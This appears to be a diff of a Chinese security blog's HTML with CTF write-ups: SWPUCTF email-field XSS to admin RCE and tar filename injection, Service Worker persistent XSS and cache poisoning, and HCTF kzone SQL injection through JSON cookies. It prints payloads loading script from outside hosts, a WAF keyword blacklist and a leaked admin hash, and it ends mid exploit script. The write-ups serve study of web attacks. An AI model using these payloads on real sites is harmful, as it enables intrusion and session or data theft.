 <p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p>
 <h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p>
 <p>给了hint:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, pleduase check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
+<pre><code>&lt;!--check.php
+if($_POST[&#39;email&#39;]) {
+$email = $_POST[&#39;email&#39;];
+if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
+echo &quot;error email, pleduase check your email&quot;;
+}else{
+echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd
+echo $email;
+}
+}
+?&gt;
+--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
 <p>大致就是单引号双引号重叠，用\可以绕过空格，</p>
 <p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</span><br></pre></td></tr></table></figure>
-
-<p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
+<pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
 <p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p>
 <p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p>
 <p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
 <p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p>
 <p>用XHR发送请求或者Location重定向都可以</p>
 <p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(&quot;upload.php&quot;);</span><br><span class="line">echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">$sys = &quot;tar -czf z.tar.gz *&quot;;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line">if(file_exists(&apos;z.tar.gz&apos;))&#123;</span><br><span class="line">        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;备份文件名: z.tar.gz&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;未上传文件，无法备份！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说它会备份我们上传目录下的所有文件，即*</p>
+<pre><code>&lt;?phpinclude(&quot;upload.php&quot;);
+echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;
+$sys = &quot;tar -czf z.tar.gz *&quot;;
+chdir($upload_dir);
+system($sys);
+if(file_exists(&#39;z.tar.gz&#39;)){
+        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;
+        echo &quot;备份文件名: z.tar.gz&quot;;
+}else{
+        echo &quot;未上传文件，无法备份！&quot;;
+}
+?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p>
 <p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p>
 <p>System 就会执行拼接后的$sys</p>
 <p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p>
@@ -571,7 +967,7 @@
             </div>
             <div class="continue">
             <a href="/2018/12/20/SWPUCTF2018 Write up/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -619,7 +1015,7 @@
             </div>
             <div class="continue">
             <a href="/2018/12/17/HCTF2018线下赛感想/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -652,25 +1048,61 @@
 <p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
 <h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
 <h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/serviceworker.js&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">normal visit</span><br></pre></td></tr></table></figure>
-
-<p>script标签下的type必须指明为<code>text/javascript</code></p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/serviceworker.js&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
 <h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
 <h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">    var url = event.request.clone(); </span><br><span class="line">    body = &apos;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    init = &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;;</span><br><span class="line">    if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;</span><br><span class="line">        res  = new Response(body,init);</span><br><span class="line">        event.respondWith(res.clone());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+    var url = event.request.clone(); 
+    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
+    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
+    if(url.url==&#39;http://localhost/reurl.html&#39;){
+        res  = new Response(body,init);
+        event.respondWith(res.clone());
+    }
+});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
 <p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// JSONP 回调名缺少校验</span><br><span class="line">$cb_name = $_GET[&apos;callback&apos;];</span><br><span class="line">$cb_data = time();</span><br><span class="line"></span><br><span class="line">header(&apos;Content-Type: application/javascript&apos;);</span><br><span class="line">echo(&quot;$cb_name($cb_data)&quot;);</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+// JSONP 回调名缺少校验
+$cb_name = $_GET[&#39;callback&#39;];
+$cb_data = time();
 
-<p>attack_js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
+header(&#39;Content-Type: application/javascript&#39;);
+echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
 <p>或者鸡肋上传一个html到网站下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">it&apos;s nothing</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
+<pre><code>&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+it&#39;s nothing
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
 <li>存在有缺陷的 JSONP 接口</li>
 <li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
 <li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
@@ -680,13 +1112,54 @@
 <h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
 <h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
 <p>下面是一个缓存读取/判断的demo</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">        event.respondWith(</span><br><span class="line">            //console.log(event.request)</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        return requestBackend(event);//没缓存就进行缓存</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">        var url = event.request.clone();  </span><br><span class="line">        console.log(url)  //打印内容是打印到请求页面</span><br><span class="line">        if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">    </span><br><span class="line">        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        return fetch(url).then(function(res)&#123;</span><br><span class="line">        //检测是否为有效响应</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        var response = res.clone();</span><br><span class="line">        caches.open(&apos;v1&apos;).then(function(cache)&#123;  //打开v1缓存进行存储</span><br><span class="line">        cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        return res;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+        event.respondWith(
+            //console.log(event.request)
+        caches.match(event.request).then(function(res){
+        if(res){//如果有缓存则使用缓存
+        return res;
+        }
+        return requestBackend(event);//没缓存就进行缓存
+        })
+        )
+   });
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
+function requestBackend(event){  
+        var url = event.request.clone();  
+        console.log(url)  //打印内容是打印到请求页面
+        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源
+
+        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
+        }
+        return fetch(url).then(function(res){
+        //检测是否为有效响应
+        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
+        return res;
+        }
+        var response = res.clone();
+        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
+        cache.put(event.request, response);
+        });
+
+        return res;
+        })
+}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
 <p>控制台输入下面的恶意代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">async function replay() &#123;</span><br><span class="line">    const name = &apos;xx&apos;</span><br><span class="line">    const url = &apos;xx&apos;</span><br><span class="line">    const payload = `</span><br><span class="line">alert(1);</span><br><span class="line">`</span><br><span class="line">    let cache = await caches.open(name);</span><br><span class="line">    let req = new Request(url);</span><br><span class="line">    let res = new Response(payload + replay + &apos;;replay()&apos;);   //执行alert+写入cache内容+执行fn</span><br><span class="line">    setInterval(_ =&gt; &#123;</span><br><span class="line">      cache.put(req, res.clone());</span><br><span class="line">    &#125;, 500);</span><br><span class="line">&#125;</span><br><span class="line">replay();</span><br></pre></td></tr></table></figure>
-
-<p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
+<pre><code>async function replay() {
+    const name = &#39;xx&#39;
+    const url = &#39;xx&#39;
+    const payload = `
+alert(1);
+`
+    let cache = await caches.open(name);
+    let req = new Request(url);
+    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
+    setInterval(_ =&gt; {
+      cache.put(req, res.clone());
+    }, 500);
+}
+replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
 <p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
 
@@ -694,7 +1167,7 @@
             </div>
             <div class="continue">
             <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -734,38 +1207,61 @@
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p>
 <h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p>
 <p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;21232f297a57a5a743894a0e4a801fc3&apos;, &apos;小杰&apos;, &apos;1503816935&apos;, 1);</span><br></pre></td></tr></table></figure>
-
-<p>登陆失败，被改了密码，开始审计</p>
+<pre><code>INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES
+(1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);</code></pre><p>登陆失败，被改了密码，开始审计</p>
 <h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p>
 <h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p>
 <h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p>
 <ol>
-<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function waf($string)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist = &apos;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&apos;; // and updatexml(1,concat(0x7e,database())</span><br><span class="line">    return preg_replace_callback($blacklist, function ($match) &#123;</span><br><span class="line">        return &apos;@&apos; . $match[0] . &apos;@&apos;;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function safe($string)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($string)) &#123;</span><br><span class="line">        foreach ($string as $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = safe($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $string = waf($string);</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<pre><code>function waf($string)
+{
+ $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;; // and updatexml(1,concat(0x7e,database())
+ return preg_replace_callback($blacklist, function ($match) {
+     return &#39;@&#39; . $match[0] . &#39;@&#39;;
+ }, $string);
+}
+</code></pre></li>
 </ol>
-<p>匹配到这些会在关键字前后添加@</p>
-<ol start="2">
-<li>member根据cookie判断是否已经登陆</li>
-<li>founction封装了一些功能函数</li>
-<li>db.class一些执行的sql语句</li>
-</ol>
-<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p>刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：<br><img src="https://i.loli.net/2018/11/13/5beac380388eb.jpg" alt><br>不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通</p>
-<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。</p>
-<h3 id="member-php"><a href="#member-php" class="headerlink" title="member.php"></a>member.php</h3><p>当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方</p>
-<p><img src="https://i.loli.net/2018/11/13/5beac35ebedb4.png" alt></p>
-<p>cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤<br><img src="https://i.loli.net/2018/11/13/5beac38e39abe.png" alt></p>
-<p>剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://kzone.2018.hctf.io/include/common.php&apos;</span><br><span class="line">str1 = 